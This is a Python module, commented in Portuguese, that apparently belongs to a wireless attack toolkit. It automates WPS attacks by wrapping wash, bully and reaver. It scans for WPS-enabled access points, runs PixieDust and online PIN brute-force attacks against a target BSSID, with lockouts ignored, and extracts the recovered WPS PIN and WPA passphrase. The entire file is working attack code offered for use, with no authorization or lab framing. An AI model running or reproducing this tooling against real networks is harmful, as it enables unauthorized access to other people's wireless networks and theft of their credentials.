"""
Módulo de ataque WPS (WiFi Protected Setup).

Este módulo implementa ataques contra redes WPS, incluindo:
- Ataque de força bruta ao PIN WPS
- Ataque PixieDust
- Ataque de PIN online
"""
import os
import re
import time
import logging
import subprocess
from typing import Optional, Dict, List, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum, auto

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn

from ...core.models.network import WiFiNetwork
from ...core.utils import (
    is_root, check_dependencies, get_network_interfaces,
    set_monitor_mode, restore_network_interface, command_exists
)

# Configuração de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
console = Console()

class WPSEventType(Enum):
    """Tipos de eventos do WPS."""
    START = auto()
    PIN_FOUND = auto()
    PIXIE_DUST = auto()
    ONLINE_BRUTE = auto()
    ERROR = auto()
    COMPLETE = auto()

@dataclass
class WPSEvent:
    """Evento de progresso do ataque WPS."""
    type: WPSEventType
    message: str = ""
    data: Dict[str, Any] = field(default_factory=dict)

class WPSAttack:
    """Classe para realizar ataques WPS."""
    
    def __init__(self, interface: str = None, timeout: int = 300):
        """
        Inicializa o ataque WPS.
        
        Args:
            interface: Interface de rede para usar no ataque
            timeout: Tempo máximo de execução em segundos
        """
        self.interface = interface
        self.timeout = timeout
        self.is_running = False
        self.stop_requested = False
        self.current_pin = ""
        self.pins_tried = 0
        self.pin_found = False
        self.pin = ""
        self.psk = ""
        
        # Verifica dependências
        self._check_dependencies()
        
        # Verifica privilégios
        if not is_root():
            raise PermissionError("Este ataque requer privilégios de root")
    
    def _check_dependencies(self) -> None:
        """Verifica se todas as dependências necessárias estão instaladas."""
        required = ['reaver', 'bully', 'wash', 'aircrack-ng']
        missing = [cmd for cmd in required if not command_exists(cmd)]
        
        if missing:
            raise RuntimeError(
                f"As seguintes dependências estão faltando: {', '.join(missing)}\n"
                "Instale-as com: sudo apt install reaver bully aircrack-ng"
            )
    
    def scan_wps_networks(self, channel: int = None) -> List[Dict[str, Any]]:
        """
        Escaneia redes com WPS ativado.
        
        Args:
            channel: Canal específico para escanear (opcional)
            
        Returns:
            Lista de redes com WPS ativado
        """
        networks = []
        
        try:
            # Cria um arquivo temporário para armazenar a saída
            import tempfile
            with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
                output_file = tmp_file.name
            
            # Comando para escanear redes WPS
            cmd = ['wash', '-i', self.interface, '-o', output_file, '--ignore-fcs']
            if channel:
                cmd.extend(['-c', str(channel)])
            
            console.print("[cyan]Escaneando redes WPS...[/]")
            
            # Executa o comando
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                console=console,
                transient=True,
            ) as progress:
                task = progress.add_task("Escaneando redes WPS...", total=None)
                
                try:
                    # Executa o wash por 30 segundos
                    process = subprocess.Popen(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        universal_newlines=True
                    )
                    
                    # Aguarda o término ou timeout
                    for _ in range(30):  # 30 segundos de escaneamento
                        if process.poll() is not None:
                            break
                        time.sleep(1)
                    
                    # Encerra o processo
                    process.terminate()
                    try:
                        process.wait(timeout=5)
                    except subprocess.TimeoutExpired:
                        process.kill()
                    
                    # Lê o arquivo de saída
                    with open(output_file, 'r') as f:
                        lines = f.readlines()
                    
                    # Processa a saída
                    for line in lines:
                        line = line.strip()
                        if not line or line.startswith('BSSID') or line.startswith('---'):
                            continue
                        
                        # Formato: BSSID Channel RSSI WPS Version WPS Locked ESSID
                        parts = re.split(r'\s{2,}', line)
                        if len(parts) >= 6:
                            network = {
                                'bssid': parts[0].strip(),
                                'channel': int(parts[1]),
                                'rssi': int(parts[2]),
                                'wps_version': parts[3],
                                'wps_locked': parts[4].lower() == 'yes',
                                'ssid': parts[5] if len(parts) > 5 else ''
                            }
                            networks.append(network)
                    
                    progress.update(task, completed=1, visible=False)
                    
                except Exception as e:
                    logger.error(f"Erro ao escanear redes WPS: {e}")
                    progress.update(task, visible=False)
                    
        except Exception as e:
            logger.error(f"Erro ao escanear redes WPS: {e}")
            
        finally:
            # Remove o arquivo temporário
            try:
                if os.path.exists(output_file):
                    os.unlink(output_file)
            except:
                pass
        
        return networks
    
    def pixie_dust_attack(self, bssid: str, channel: int, callback=None) -> Tuple[bool, str, str]:
        """
        Realiza o ataque PixieDust contra uma rede WPS.
        
        Args:
            bssid: Endereço MAC do ponto de acesso
            channel: Canal da rede
            callback: Função de callback para eventos
            
        Returns:
            Tupla (sucesso, PIN, PSK)
        """
        self.is_running = True
        self.stop_requested = False
        self.pin_found = False
        self.pin = ""
        self.psk = ""
        
        # Configura o monitoramento de eventos
        def event_handler(event_type: WPSEventType, message: str = "", **kwargs):
            if callback:
                event = WPSEvent(type=event_type, message=message, data=kwargs)
                callback(event)
        
        try:
            # Verifica se o bully está disponível
            if not command_exists('bully'):
                event_handler(
                    WPSEventType.ERROR,
                    "O comando 'bully' não foi encontrado. Instale-o com: sudo apt install bully"
                )
                return False, "", ""
            
            # Cria um arquivo temporário para armazenar a saída
            import tempfile
            with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
                output_file = tmp_file.name
            
            # Comando para o ataque PixieDust
            cmd = [
                'bully',
                '-b', bssid,          # BSSID do alvo
                '-c', str(channel),   # Canal
                '-p', '1',            # Modo PixieDust
                '--pixie-dust',       # Força o ataque PixieDust
                '-v', '3',            # Modo verboso
                '-F',                 # Ignora erros de FCS
                '-B',                 # Ignora bloqueios
                '-d',                 # Mostra códigos PIN
                '-l', '100',          # Limite de tentativas
                '--pixie-sleep', '1', # Tempo de espera entre tentativas
                self.interface        # Interface de rede
            ]
            
            event_handler(WPSEventType.START, "Iniciando ataque PixieDust...")
            
            # Executa o comando
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            
            # Monitora a saída
            pin_pattern = re.compile(r'\[\+\]\s+Pin\s+is\s+([0-9]{8})')
            psk_pattern = re.compile(r'\[\+\]\s+WPA\s+PSK:\s+([^\s]+)')
            
            start_time = time.time()
            
            while True:
                # Verifica timeout
                if time.time() - start_time > self.timeout:
                    event_handler(
                        WPSEventType.ERROR,
                        "Tempo limite excedido no ataque PixieDust"
                    )
                    process.terminate()
                    break
                
                # Verifica se foi solicitado para parar
                if self.stop_requested:
                    event_handler(
                        WPSEventType.ERROR,
                        "Ataque interrompido pelo usuário"
                    )
                    process.terminate()
                    break
                
                # Lê a saída
                line = process.stdout.readline()
                if not line and process.poll() is not None:
                    break
                
                if line:
                    # Verifica se encontrou o PIN
                    pin_match = pin_pattern.search(line)
                    if pin_match:
                        self.pin = pin_match.group(1)
                        self.pin_found = True
                        event_handler(
                            WPSEventType.PIN_FOUND,
                            f"PIN encontrado: {self.pin}",
                            pin=self.pin
                        )
                    
                    # Verifica se encontrou a PSK
                    psk_match = psk_pattern.search(line)
                    if psk_match:
                        self.psk = psk_match.group(1)
                        event_handler(
                            WPSEventType.COMPLETE,
                            f"Senha encontrada: {self.psk}",
                            pin=self.pin,
                            psk=self.psk
                        )
                        return True, self.pin, self.psk
                    
                    # Envia a saída para o callback
                    event_handler(WPSEventType.PIXIE_DUST, line.strip())
            
            # Verifica se o processo terminou com sucesso
            if process.poll() == 0 and self.pin_found:
                return True, self.pin, self.psk
            
            return False, "", ""
            
        except Exception as e:
            event_handler(
                WPSEventType.ERROR,
                f"Erro durante o ataque PixieDust: {str(e)}"
            )
            return False, "", ""
            
        finally:
            self.is_running = False
            # Remove o arquivo temporário
            try:
                if os.path.exists(output_file):
                    os.unlink(output_file)
            except:
                pass
    
    def online_brute_force(self, bssid: str, channel: int, pin_file: str = None, 
                          callback=None) -> Tuple[bool, str, str]:
        """
        Realiza um ataque de força bruta online ao PIN WPS.
        
        Args:
            bssid: Endereço MAC do ponto de acesso
            channel: Canal da rede
            pin_file: Caminho para o arquivo de PINs (opcional)
            callback: Função de callback para eventos
            
        Returns:
            Tupla (sucesso, PIN, PSK)
        """
        self.is_running = True
        self.stop_requested = False
        self.pin_found = False
        self.pin = ""
        self.psk = ""
        
        # Configura o monitoramento de eventos
        def event_handler(event_type: WPSEventType, message: str = "", **kwargs):
            if callback:
                event = WPSEvent(type=event_type, message=message, data=kwargs)
                callback(event)
        
        try:
            # Verifica se o reaver está disponível
            if not command_exists('reaver'):
                event_handler(
                    WPSEventType.ERROR,
                    "O comando 'reaver' não foi encontrado. Instale-o com: sudo apt install reaver"
                )
                return False, "", ""
            
            # Cria um arquivo temporário para armazenar a saída
            import tempfile
            with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
                output_file = tmp_file.name
            
            # Comando para o ataque de força bruta
            cmd = [
                'reaver',
                '-i', self.interface,  # Interface de rede
                '-b', bssid,          # BSSID do alvo
                '-c', str(channel),   # Canal
                '-vv',                # Modo verboso
                '-K', '1',           # Executa o ataque PixieDust primeiro
                '-N', 'F:'            # Ignora relatórios de estado
            ]
            
            # Adiciona o arquivo de PINs, se fornecido
            if pin_file and os.path.exists(pin_file):
                cmd.extend(['-p', pin_file])
            
            event_handler(WPSEventType.START, "Iniciando ataque de força bruta online...")
            
            # Executa o comando
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            
            # Monitora a saída
            pin_pattern = re.compile(r'\[\+\]\s+PIN\s+is\s+'r'([0-9]{8})')
            psk_pattern = re.compile(r'\[\+\]\s+WPA\s+PSK:\s+([^\s]+)')
            
            start_time = time.time()
            
            while True:
                # Verifica timeout
                if time.time() - start_time > self.timeout:
                    event_handler(
                        WPSEventType.ERROR,
                        "Tempo limite excedido no ataque de força bruta"
                    )
                    process.terminate()
                    break
                
                # Verifica se foi solicitado para parar
                if self.stop_requested:
                    event_handler(
                        WPSEventType.ERROR,
                        "Ataque interrompido pelo usuário"
                    )
                    process.terminate()
                    break
                
                # Lê a saída
                line = process.stdout.readline()
                if not line and process.poll() is not None:
                    break
                
                if line:
                    # Verifica se encontrou o PIN
                    pin_match = pin_pattern.search(line)
                    if pin_match:
                        self.pin = pin_match.group(1)
                        self.pin_found = True
                        event_handler(
                            WPSEventType.PIN_FOUND,
                            f"PIN encontrado: {self.pin}",
                            pin=self.pin
                        )
                    
                    # Verifica se encontrou a PSK
                    psk_match = psk_pattern.search(line)
                    if psk_match:
                        self.psk = psk_match.group(1)
                        event_handler(
                            WPSEventType.COMPLETE,
                            f"Senha encontrada: {self.psk}",
                            pin=self.pin,
                            psk=self.psk
                        )
                        return True, self.pin, self.psk
                    
                    # Envia a saída para o callback
                    event_handler(WPSEventType.ONLINE_BRUTE, line.strip())
            
            # Verifica se o processo terminou com sucesso
            if process.poll() == 0 and self.pin_found:
                return True, self.pin, self.psk
            
            return False, "", ""
            
        except Exception as e:
            event_handler(
                WPSEventType.ERROR,
                f"Erro durante o ataque de força bruta: {str(e)}"
            )
            return False, "", ""
            
        finally:
            self.is_running = False
            # Remove o arquivo temporário
            try:
                if os.path.exists(output_file):
                    os.unlink(output_file)
            except:
                pass
    
    def stop(self):
        """Solicita a interrupção do ataque."""
        self.stop_requested = True
